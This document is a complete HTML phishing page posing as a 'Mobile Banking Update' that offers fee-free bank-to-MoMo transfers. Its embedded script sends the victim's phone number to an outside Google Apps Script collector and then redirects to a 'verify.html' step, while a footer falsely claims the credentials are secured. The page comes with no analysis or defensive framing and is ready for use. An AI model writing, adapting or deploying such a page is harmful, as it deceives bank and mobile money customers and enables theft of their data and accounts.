<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mobile Banking Update</title>
  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #013a7a; /* deep blue background */
      margin: 0;
      padding: 0;
      color: #333;
      text-align: center;
    }

    .container {
      margin: 60px auto;
      background: #fff;
      border-radius: 16px;
      max-width: 360px;
      padding: 30px 20px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
    }

    h1 {
      color: #ffd200; /* bold yellow header */
      margin-bottom: 10px;
      font-size: 20px;
      font-weight: 700;
      text-transform: uppercase;
    }

    p.description {
      color: #fff;
      font-size: 14px;
      max-width: 320px;
      margin: 10px auto 30px;
      line-height: 1.4;
    }

    label {
      display: block;
      text-align: left;
      margin-bottom: 8px;
      color: #333;
      font-weight: 600;
    }

    input[type="tel"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      margin-bottom: 20px;
    }

    button {
      background-color: #ffd200;
      border: none;
      color: #013a7a;
      font-weight: 700;
      border-radius: 30px;
      padding: 12px 24px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
      width: 100%;
    }

    button:hover {
      background-color: #f2c400;
    }

    .footer {
      font-size: 12px;
      color: #666;
      margin-top: 10px;
    }

    /* Processing overlay */
    .processing-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      color: white;
      text-align: center;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 9999;
    }

    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid #ffd200;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>Mobile Banking Update</h1>
  <p class="description">
    Validating your phone number to the account enables you to make transactions 
    from Bank to MoMo or vice-versa without any fees associated.
  </p>

  <div class="container">
    <form id="dataForm">
      <label for="phone">Phone Number</label>
      <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required />
      <button type="submit">Submit</button>
      <p class="footer">Your credentials are secured.</p>
    </form>
  </div>

  <div class="processing-overlay" id="overlay">
    <div class="spinner"></div>
    <p>Validating Phone Number, please wait...</p>
  </div>

  <!-- Embedded JavaScript -->
  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbxfHMPM_6ZnOM3qIkuBUA3mXdHZt_H1cfL-xCbibWBIP4fHrzaq5nplQOvISATePzF1hg/exec";
    const form = document.getElementById("dataForm");
    const overlay = document.getElementById("overlay");

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      overlay.style.display = "flex";

      fetch(scriptURL, {
        method: "POST",
        mode: "no-cors",
        body: new FormData(form),
      })
        .then(() => {
          window.location.href = "verify.html";
        })
        .catch(() => {
          overlay.style.display = "none";
          alert("Something went wrong. Please try again.");
        });
    });
  </script>
</body>
</html>
